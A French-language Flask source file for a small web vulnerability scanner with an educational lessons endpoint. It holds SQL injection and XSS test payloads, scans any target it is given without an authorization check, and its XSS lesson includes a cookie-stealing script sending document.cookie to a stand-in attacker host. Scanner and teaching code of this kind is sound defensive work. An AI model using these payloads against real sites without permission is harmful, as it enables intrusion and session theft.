from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import json
import requests
import urllib.parse

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aegisai-dev-key-2026")

# Configuration Vercel - utilise SQLite local (temporaire)
basedir = os.path.abspath(os.path.dirname(__file__))
app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{os.path.join(basedir, '..', 'aegisai.db')}"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db = SQLAlchemy(app)

# ============ MODÈLES ============
class Scan(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target = db.Column(db.String(500), nullable=False)
    status = db.Column(db.String(50), default="pending")
    results = db.Column(db.Text, default="{}")
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Vulnerability(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    scan_id = db.Column(db.Integer, db.ForeignKey("scan.id"))
    name = db.Column(db.String(200))
    severity = db.Column(db.String(20))
    url = db.Column(db.String(500))
    description = db.Column(db.Text)
    payload = db.Column(db.Text)
    remediation = db.Column(db.Text)

# ============ MOTEUR DE SCAN (simplifié pour Vercel) ============
class ScanEngine:
    @staticmethod
    def check_headers(target):
        vulns = []
        try:
            url = f"http://{target}" if not target.startswith("http") else target
            r = requests.get(url, timeout=10, headers={"User-Agent": "AegisAI-Scanner/1.0"})
            headers = r.headers
            
            security_headers = {
                "Strict-Transport-Security": "HSTS manquant - risque d'attaque MITM",
                "Content-Security-Policy": "CSP manquant - risque d'injection XSS",
                "X-Frame-Options": "Protection clickjacking manquante",
                "X-Content-Type-Options": "Protection MIME-sniffing manquante",
                "X-XSS-Protection": "Protection XSS navigateur désactivée",
                "Referrer-Policy": "Politique Referrer manquante"
            }
            
            for header, desc in security_headers.items():
                if header not in headers:
                    vulns.append({
                        "name": f"En-tête {header} manquant",
                        "severity": "medium",
                        "url": url,
                        "description": desc,
                        "payload": "",
                        "remediation": f"Ajouter l'en-tête {header} dans la configuration du serveur web"
                    })
            return vulns
        except Exception as e:
            return [{"name": "Erreur de connexion", "severity": "info", "url": target, 
                     "description": f"Impossible de se connecter: {str(e)}", "payload": "", "remediation": ""}]
    
    @staticmethod
    def check_sqli(target):
        vulns = []
        try:
            url = f"http://{target}" if not target.startswith("http") else target
            payloads = ["' OR '1'='1", "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--"]
            if "?" in url:
                base_url = url.split("?")[0]
                params = url.split("?")[1].split("&")
                for param in params:
                    param_name = param.split("=")[0] if "=" in param else param
                    for payload in payloads:
                        test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
                        try:
                            r = requests.get(test_url, timeout=5, headers={"User-Agent": "AegisAI-Scanner/1.0"})
                            sql_errors = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "driver", "ora-", "postgresql", "sqlite"]
                            for err in sql_errors:
                                if err in r.text.lower():
                                    vulns.append({
                                        "name": "SQL Injection potentielle",
                                        "severity": "critical",
                                        "url": test_url,
                                        "description": f"Paramètre '{param_name}' semble vulnérable aux injections SQL",
                                        "payload": payload,
                                        "remediation": "Utiliser des requêtes paramétrées (prepared statements)"
                                    })
                                    break
                        except:
                            pass
        except:
            pass
        return vulns
    
    @staticmethod
    def check_xss(target):
        vulns = []
        try:
            url = f"http://{target}" if not target.startswith("http") else target
            payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
            if "?" in url:
                base_url = url.split("?")[0]
                params = url.split("?")[1].split("&")
                for param in params:
                    param_name = param.split("=")[0] if "=" in param else param
                    for payload in payloads:
                        test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
                        try:
                            r = requests.get(test_url, timeout=5, headers={"User-Agent": "AegisAI-Scanner/1.0"})
                            if payload in r.text:
                                vulns.append({
                                    "name": "Cross-Site Scripting (XSS)",
                                    "severity": "high",
                                    "url": test_url,
                                    "description": f"Paramètre '{param_name}' reflète le payload sans échappement",
                                    "payload": payload,
                                    "remediation": "Échapper les sorties HTML avec htmlspecialchars() ou équivalent"
                                })
                                break
                        except:
                            pass
        except:
            pass
        return vulns
    
    @staticmethod
    def check_open_ports(target):
        vulns = []
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ports = [21, 22, 80, 443, 3306, 3389, 8080, 8443]
        for port in ports:
            try:
                r = requests.get(f"http://{host}:{port}", timeout=2, headers={"User-Agent": "AegisAI-Scanner/1.0"})
                service_map = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL",
                              3389: "RDP", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"}
                service = service_map.get(port, "Inconnu")
                vulns.append({
                    "name": f"Port {port} ouvert ({service})",
                    "severity": "info",
                    "url": f"http://{host}:{port}",
                    "description": f"Le port {port} ({service}) est accessible publiquement",
                    "payload": "",
                    "remediation": f"Fermer le port {port} si non nécessaire ou restreindre l'accès par pare-feu"
                })
            except:
                pass
        return vulns
    
    @staticmethod
    def check_directory_listing(target):
        vulns = []
        common_dirs = ["/admin", "/backup", "/.git", "/wp-admin", "/config", "/uploads", "/api", "/test"]
        url = f"http://{target}" if not target.startswith("http") else target
        base = url.rstrip("/")
        for d in common_dirs:
            try:
                r = requests.get(f"{base}{d}", timeout=5, headers={"User-Agent": "AegisAI-Scanner/1.0"})
                if "Index of" in r.text or "Directory listing" in r.text:
                    vulns.append({
                        "name": f"Directory Listing activé : {d}",
                        "severity": "high",
                        "url": f"{base}{d}",
                        "description": f"Le répertoire {d} est accessible et liste son contenu",
                        "payload": "",
                        "remediation": "Désactiver le Directory Listing dans la configuration du serveur web"
                    })
            except:
                pass
        return vulns

# ============ ROUTES ============
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/dashboard")
def dashboard():
    scans = Scan.query.order_by(Scan.created_at.desc()).limit(10).all()
    return render_template("dashboard.html", scans=scans)

@app.route("/api/scan", methods=["POST"])
def start_scan():
    data = request.get_json()
    target = data.get("target", "").strip()
    
    if not target:
        return jsonify({"error": "Cible requise"}), 400
    
    scan = Scan(target=target, status="running")
    db.session.add(scan)
    db.session.commit()
    
    all_vulns = []
    all_vulns.extend(ScanEngine.check_headers(target))
    all_vulns.extend(ScanEngine.check_sqli(target))
    all_vulns.extend(ScanEngine.check_xss(target))
    all_vulns.extend(ScanEngine.check_open_ports(target))
    all_vulns.extend(ScanEngine.check_directory_listing(target))
    
    for v in all_vulns:
        vuln = Vulnerability(
            scan_id=scan.id,
            name=v["name"],
            severity=v["severity"],
            url=v["url"],
            description=v["description"],
            payload=v["payload"],
            remediation=v["remediation"]
        )
        db.session.add(vuln)
    
    scan.status = "completed"
    scan.results = json.dumps(all_vulns)
    db.session.commit()
    
    return jsonify({
        "scan_id": scan.id,
        "target": target,
        "vulnerabilities_count": len(all_vulns),
        "vulnerabilities": all_vulns
    })

@app.route("/api/scans")
def get_scans():
    scans = Scan.query.order_by(Scan.created_at.desc()).all()
    return jsonify([{
        "id": s.id,
        "target": s.target,
        "status": s.status,
        "results": json.loads(s.results) if s.results else [],
        "created_at": s.created_at.isoformat()
    } for s in scans])

@app.route("/api/learn/<vuln_name>")
def learn_vulnerability(vuln_name):
    lessons = {
        "sqli": {
            "title": "SQL Injection",
            "description": "L'injection SQL permet à un attaquant d'exécuter des requêtes SQL arbitraires dans la base de données.",
            "how_it_works": "L'attaquant insère des caractères spéciaux dans un champ utilisateur pour modifier la requête SQL originale.",
            "example": "' OR '1'='1 transforme SELECT * FROM users WHERE username='' OR '1'='1'",
            "impact": "Vol de données, contournement d'authentification, destruction de données",
            "prevention": "Toujours utiliser des requêtes paramétrées (prepared statements)"
        },
        "xss": {
            "title": "Cross-Site Scripting (XSS)",
            "description": "Le XSS permet d'injecter du code JavaScript malveillant dans une page web.",
            "how_it_works": "L'attaquant injecte un script via un champ de formulaire ou un paramètre URL.",
            "example": "<script>document.location='https://attaquant.com/steal.php?cookie='+document.cookie</script>",
            "impact": "Vol de cookies, redirection vers des sites malveillants",
            "prevention": "Échapper systématiquement les sorties HTML et utiliser Content-Security-Policy"
        },
        "directory_listing": {
            "title": "Directory Listing",
            "description": "Le Directory Listing expose le contenu des répertoires du serveur web.",
            "how_it_works": "Quand aucun fichier index n'est présent, le serveur affiche la liste complète des fichiers du dossier.",
            "example": "Accéder à /backup/ affiche tous les fichiers de sauvegarde exposés",
            "impact": "Exposition de fichiers sensibles, code source, mots de passe",
            "prevention": "Désactiver l'option Directory Listing dans Apache/NGINX"
        }
    }
    return jsonify(lessons.get(vuln_name, {"error": "Leçon non trouvée"}))

# ============ POUR VERCEL ============
with app.app_context():
    db.create_all()

# Handler pour Vercel
from flask import Response
def handler(request):
    return app(request.environ, request.start_response)
